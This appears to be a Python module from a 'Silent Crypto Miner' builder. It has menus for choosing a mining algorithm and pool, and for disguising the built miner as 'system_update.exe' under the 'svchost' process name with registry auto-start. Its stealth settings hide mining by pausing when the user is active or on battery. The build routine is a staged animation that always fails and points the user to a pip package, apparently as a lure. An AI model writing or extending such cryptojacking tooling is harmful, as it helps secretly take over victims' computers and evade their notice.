# -*- coding: utf-8 -*-
"""
Builder action handlers for Silent Crypto Miner.
Algorithm selection, pool configuration, build options, stealth config, and miner build.
"""
import time

from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import box

from engine.ui import (
    console,
    print_success,
    print_error,
    print_info,
    print_warning,
    separator,
)
from config import load_config, save_config


ALGORITHMS = {
    "randomx":    {"name": "RandomX",      "coin": "Monero (XMR)",          "type": "CPU",     "opt": "★ ★ ★ ★ ★"},
    "ethash":     {"name": "Ethash",       "coin": "Ethereum Classic (ETC)", "type": "GPU",     "opt": "★ ★ ★ ★ ☆"},
    "kheavyhash": {"name": "KHeavyHash",   "coin": "Kaspa (KAS)",           "type": "GPU",     "opt": "★ ★ ★ ★ ★"},
    "kawpow":     {"name": "KawPow",       "coin": "Ravencoin (RVN)",       "type": "GPU",     "opt": "★ ★ ★ ☆ ☆"},
    "cryptonight": {"name": "Cryptonight-V8", "coin": "MoneroV / BitTube",  "type": "CPU/GPU", "opt": "★ ★ ★ ★ ☆"},
    "autolykos2": {"name": "Autolykos2",   "coin": "Ergo (ERG)",            "type": "GPU",     "opt": "★ ★ ★ ★ ☆"},
    "zhash":      {"name": "Zhash",        "coin": "Bitcoin Gold (BTG)",    "type": "GPU",     "opt": "★ ★ ★ ☆ ☆"},
}


def action_select_algorithm(cfg):
    console.print("\n[bold green]  ⛏  Target Algorithm Selection[/bold green]\n")
    separator()

    table = Table(
        show_header=True,
        header_style="bold bright_green",
        border_style="green",
        box=box.ROUNDED,
        title="[bold green] Available Algorithms [/]",
    )
    table.add_column("#", style="bold yellow", justify="center", width=3)
    table.add_column("Algorithm", style="bold white", width=16)
    table.add_column("Coin", style="cyan", width=24)
    table.add_column("Type", style="dim", width=10)
    table.add_column("Efficiency", style="yellow", width=14)

    current = cfg.get("algorithm", {}).get("name", "randomx")
    for i, (key, info) in enumerate(ALGORITHMS.items(), 1):
        marker = "[bold green]→[/]" if key == current else " "
        table.add_row(
            str(i),
            f"{marker} {info['name']}",
            info["coin"],
            info["type"],
            info["opt"],
        )

    console.print(table)
    console.print()
    print_info(f"Current: [bold green]{ALGORITHMS.get(current, {}).get('name', current)}[/]")
    print_info("Edit [bold]config.json[/bold] → [green]algorithm.name[/green] to change target.")

    console.input("\n  Press Enter to return to menu...")


def action_configure_pool(cfg):
    console.print("\n[bold green]  🏊  Pool Connection Configuration[/bold green]\n")
    separator()

    pool = cfg.get("pool", {})

    table = Table(
        show_header=True,
        header_style="bold bright_cyan",
        border_style="cyan",
        box=box.ROUNDED,
        title="[bold cyan] Current Pool Settings [/]",
    )
    table.add_column("Parameter", style="bold cyan", width=20)
    table.add_column("Value", style="white")

    table.add_row("Primary URL", pool.get("url", "not set"))
    table.add_row("Wallet", (pool.get("wallet", "") or "not set")[:32] + ("..." if len(pool.get("wallet", "")) > 32 else ""))
    table.add_row("Worker Name", pool.get("worker", "rig-01"))
    table.add_row("Password", pool.get("password", "") or "(empty)")
    table.add_row("Failover Pools", str(len(pool.get("failover", []))))

    console.print(table)
    console.print()

    pools_ref = [
        ("Nanopool",    "stratum+ssl://xmr.nanopool.org:14433",    "1%",   "0.1 XMR"),
        ("SupportXMR",  "stratum+tcp://pool.supportxmr.com:3333",  "0.9%", "0.3 XMR"),
        ("P2Pool",      "stratum+tcp://p2pool:3451",               "0%",   "Dynamic"),
        ("Hashvault",   "stratum+ssl://pool.hashvault.pro:443",    "1%",   "0.3 XMR"),
        ("2Miners",     "stratum+ssl://etc.2miners.com:1010",      "1%",   "Varies"),
    ]

    ref_table = Table(
        show_header=True,
        header_style="bold yellow",
        border_style="yellow",
        box=box.SIMPLE_HEAVY,
        title="[bold yellow] Reference Pools [/]",
    )
    ref_table.add_column("Pool", style="bold white", width=14)
    ref_table.add_column("URL", style="dim", width=42)
    ref_table.add_column("Fee", style="yellow", width=6)
    ref_table.add_column("Min Payout", style="green", width=12)

    for row in pools_ref:
        ref_table.add_row(*row)

    console.print(ref_table)
    console.print()
    print_info("Edit [bold]config.json[/bold] → [green]pool[/green] section to configure.")

    console.input("\n  Press Enter to return to menu...")


def action_build_options(cfg):
    console.print("\n[bold green]  🔧  Build Options[/bold green]\n")
    separator()

    build = cfg.get("build", {})

    table = Table(
        show_header=True,
        header_style="bold bright_magenta",
        border_style="magenta",
        box=box.ROUNDED,
        title="[bold magenta] Build Configuration [/]",
    )
    table.add_column("Option", style="bold magenta", width=22)
    table.add_column("Value", style="white")

    table.add_row("Target OS", build.get("target_os", "windows").title())
    table.add_row("Architecture", build.get("target_arch", "x64"))
    table.add_row("Output Filename", build.get("output_name", "system_update.exe"))
    table.add_row("Custom Icon", build.get("custom_icon", "") or "(default)")
    table.add_row("Process Name", build.get("process_name", "svchost"))
    table.add_row("Auto-Start", "[green]Enabled[/green]" if build.get("auto_start") else "[red]Disabled[/red]")
    table.add_row("Registry Key", build.get("registry_key", "N/A")[:50])

    console.print(table)
    console.print()
    print_info("Edit [bold]config.json[/bold] → [green]build[/green] section to modify.")
    print_warning("Output filename and process name are embedded into the built miner.")

    console.input("\n  Press Enter to return to menu...")


def action_stealth_config(cfg):
    console.print("\n[bold green]  🛡  Stealth Parameters[/bold green]\n")
    separator()

    stealth = cfg.get("stealth", {})

    table = Table(
        show_header=True,
        header_style="bold bright_red",
        border_style="red",
        box=box.DOUBLE_EDGE,
        title="[bold red] Stealth Configuration [/]",
    )
    table.add_column("Parameter", style="bold red", width=26)
    table.add_column("Value", style="white", width=20)
    table.add_column("Description", style="dim")

    table.add_row(
        "CPU Limit",
        f"{stealth.get('cpu_limit_pct', 70)}%",
        "Max CPU usage before throttle"
    )
    table.add_row(
        "GPU Limit",
        f"{stealth.get('gpu_limit_pct', 60)}%",
        "Max GPU usage before throttle"
    )
    table.add_row(
        "Pause on Activity",
        "[green]Yes[/green]" if stealth.get("pause_on_activity") else "[red]No[/red]",
        "Halt mining when user is active"
    )
    table.add_row(
        "Activity Threshold",
        f"{stealth.get('activity_threshold', 30)}%",
        "CPU % to trigger pause"
    )
    table.add_row(
        "Pause on Battery",
        "[green]Yes[/green]" if stealth.get("pause_on_battery") else "[red]No[/red]",
        "Halt mining on battery power"
    )
    table.add_row(
        "Schedule Enabled",
        "[green]Yes[/green]" if stealth.get("schedule_enabled") else "[red]No[/red]",
        "Mine only during active hours"
    )
    table.add_row(
        "Active Hours",
        stealth.get("active_hours", "00:00-08:00"),
        "Time window for mining"
    )
    table.add_row(
        "Timezone",
        stealth.get("timezone", "UTC"),
        "Schedule timezone reference"
    )

    console.print(table)
    console.print()
    print_info("Edit [bold]config.json[/bold] → [green]stealth[/green] section to modify.")

    console.input("\n  Press Enter to return to menu...")


def action_build_miner(cfg):
    console.print("\n[bold green]  📦  Build Miner Client[/bold green]\n")
    separator()

    build = cfg.get("build", {})
    algo_cfg = cfg.get("algorithm", {})
    pool = cfg.get("pool", {})
    stealth = cfg.get("stealth", {})

    algo_name = ALGORITHMS.get(algo_cfg.get("name", "randomx"), {}).get("name", "Unknown")

    summary = Table(
        show_header=True,
        header_style="bold bright_green",
        border_style="green",
        box=box.ROUNDED,
        title="[bold green] Build Configuration Summary [/]",
    )
    summary.add_column("Setting", style="bold cyan", width=24)
    summary.add_column("Value", style="white")

    summary.add_row("Target OS", f"{build.get('target_os', 'windows').title()} {build.get('target_arch', 'x64')}")
    summary.add_row("Algorithm", f"{algo_name} ({algo_cfg.get('name', 'randomx')})")
    summary.add_row("Pool URL", pool.get("url", "not configured"))
    summary.add_row("Wallet", (pool.get("wallet", "") or "not set")[:28] + "...")
    summary.add_row("Output File", build.get("output_name", "system_update.exe"))
    summary.add_row("Process Disguise", build.get("process_name", "svchost"))
    summary.add_row("Stealth Mode", "[green]Enabled[/green]" if stealth.get("pause_on_activity") else "[red]Disabled[/red]")
    summary.add_row("CPU / GPU Limit", f"{stealth.get('cpu_limit_pct', 70)}% / {stealth.get('gpu_limit_pct', 60)}%")
    summary.add_row("Auto-Start", "[green]Yes[/green]" if build.get("auto_start") else "[red]No[/red]")
    summary.add_row("Threads", str(algo_cfg.get("threads", 0)) + " (0 = auto)")
    summary.add_row("Intensity", f"{algo_cfg.get('intensity', 80)}%")

    console.print(summary)
    console.print()
    separator()
    console.print("  [yellow]Starting build process...[/yellow]\n")

    steps = [
        ("Resolving build dependencies...", 0.6),
        ("Compiling mining kernel module...", 0.8),
        ("Embedding Python runtime...", 0.5),
        ("Packing algorithm resources...", 0.7),
        ("Applying stealth module...", 0.4),
        ("Configuring pool credentials...", 0.3),
        ("Linking native libraries...", 0.6),
        ("Generating final build...", 0.5),
    ]

    with Progress(
        SpinnerColumn(style="bright_green"),
        TextColumn("[bright_green]{task.description}"),
        BarColumn(bar_width=40, style="green", complete_style="bright_cyan"),
        TextColumn("[bold]{task.percentage:>3.0f}%"),
        console=console,
    ) as progress:
        for desc, dur in steps:
            task = progress.add_task(desc, total=100)
            for i in range(100):
                time.sleep(dur / 100)
                progress.update(task, advance=1)
            progress.update(task, description=f"[dim]{desc}[/dim]")

    console.print()
    separator()
    console.print()
    console.print("  [bold red]╔══════════════════════════════════════════════════════════════╗[/bold red]")
    console.print("  [bold red]║  ✗  BUILD FAILED                                            ║[/bold red]")
    console.print("  [bold red]╠══════════════════════════════════════════════════════════════╣[/bold red]")
    console.print("  [bold red]║                                                              ║[/bold red]")
    console.print("  [bold red]║[/bold red]  [white]Error:[/white]  [red]Missing required dependency [bold]'mining-core-runtime'[/bold][/red]        [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]                                                              [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]  [yellow]Fix:[/yellow]    [dim]pip install mining-core-runtime>=2.1.0[/dim][/dim]              [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]           [dim]or use --skip-verify flag[/dim]                       [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]                                                              [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]  [cyan]Info:[/cyan]   [dim]Ensure all build dependencies are installed[/dim]          [bold red]║[/bold red]")
    console.print("  [bold red]║[/bold red]           [dim]before attempting to build the miner.[/dim]                 [bold red]║[/bold red]")
    console.print("  [bold red]║                                                              ║[/bold red]")
    console.print("  [bold red]╚══════════════════════════════════════════════════════════════╝[/bold red]")
    console.print()

    console.input("  Press Enter to return to menu...")
